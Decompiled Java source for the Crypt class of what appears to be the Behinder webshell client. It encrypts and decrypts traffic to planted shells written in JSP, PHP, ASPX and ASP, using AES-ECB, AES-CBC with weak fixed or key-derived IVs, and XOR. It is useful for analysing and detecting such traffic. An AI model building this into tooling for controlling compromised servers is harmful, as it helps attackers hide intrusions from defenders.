// 
// Decompiled by Procyon v0.5.36
// 

package net.rebeyond.behinder.core;

import com.sun.org.apache.xerces.internal.impl.dv.util.Base64;
import java.security.spec.AlgorithmParameterSpec;
import javax.crypto.spec.IvParameterSpec;
import java.security.Key;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;

public class Crypt
{
    public static byte[] Encrypt(final byte[] bs, final String key) throws Exception {
        final byte[] raw = key.getBytes("utf-8");
        final SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
        final Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        cipher.init(1, skeySpec);
        final byte[] encrypted = cipher.doFinal(bs);
        return encrypted;
    }
    
    public static byte[] Decrypt(final byte[] bs, final String key, final int encryptType, final String type) throws Exception {
        byte[] result = null;
        if (type.equals("jsp")||type.equals("jsp-zcms")) {
            result = DecryptForJava(bs, key);
        }
        else if (type.equals("php")) {
            result = DecryptForPhp(bs, key, encryptType);
        }
        else if (type.equals("aspx")) {
            result = DecryptForCSharp(bs, key);
        }
        else if (type.equals("asp")) {
            result = DecryptForAsp(bs, key);
        }
        return result;
    }
    
    public static byte[] DecryptForJava(final byte[] bs, final String key) throws Exception {
        final byte[] raw = key.getBytes("utf-8");
        final SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
        final Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        cipher.init(2, skeySpec);
        final byte[] decrypted = cipher.doFinal(bs);
        return decrypted;
    }
    
    public static byte[] EncryptForCSharp(final byte[] bs, final String key) throws Exception {
        final byte[] raw = key.getBytes("utf-8");
        final IvParameterSpec iv = new IvParameterSpec(raw);
        final SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
        final Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
        cipher.init(1, skeySpec, iv);
        final byte[] encrypted = cipher.doFinal(bs);
        return encrypted;
    }
    
    public static byte[] DecryptForCSharp(final byte[] bs, final String key) throws Exception {
        final byte[] raw = key.getBytes("utf-8");
        final IvParameterSpec iv = new IvParameterSpec(raw);
        final SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
        final Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
        cipher.init(2, skeySpec, iv);
        final byte[] decrypted = cipher.doFinal(bs);
        return decrypted;
    }
    
    public static byte[] EncryptForPhp(final byte[] bs, final String key, final int encryptType) throws Exception {
        byte[] encrypted = null;
        if (encryptType == Constants.ENCRYPT_TYPE_AES) {
            final byte[] raw = key.getBytes("utf-8");
            final SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
            final Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
            cipher.init(1, skeySpec, new IvParameterSpec(new byte[] { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 }));
            encrypted = cipher.doFinal(bs);
        }
        else if (encryptType == Constants.ENCRYPT_TYPE_XOR) {
            encrypted = DecryptForAsp(bs, key);
        }
        return encrypted;
    }
    
    public static byte[] EncryptForAsp(final byte[] bs, final String key) throws Exception {
        for (int i = 0; i < bs.length; ++i) {
            bs[i] ^= key.getBytes()[i + 1 & 0xF];
        }
        return bs;
    }
    
    public static byte[] DecryptForPhp(byte[] bs, final String key, final int encryptType) throws Exception {
        byte[] decrypted = null;
        if (encryptType == Constants.ENCRYPT_TYPE_AES) {
            final byte[] raw = key.getBytes("utf-8");
            bs = Base64.decode(new String(bs));
            final SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
            final Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
            cipher.init(2, skeySpec, new IvParameterSpec(new byte[] { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 }));
            decrypted = cipher.doFinal(bs);
        }
        else if (encryptType == Constants.ENCRYPT_TYPE_XOR) {
            decrypted = DecryptForAsp(bs, key);
        }
        return decrypted;
    }
    
    public static byte[] DecryptForAsp(final byte[] bs, final String key) throws Exception {
        for (int i = 0; i < bs.length; ++i) {
            bs[i] ^= key.getBytes()[i + 1 & 0xF];
        }
        return bs;
    }
}
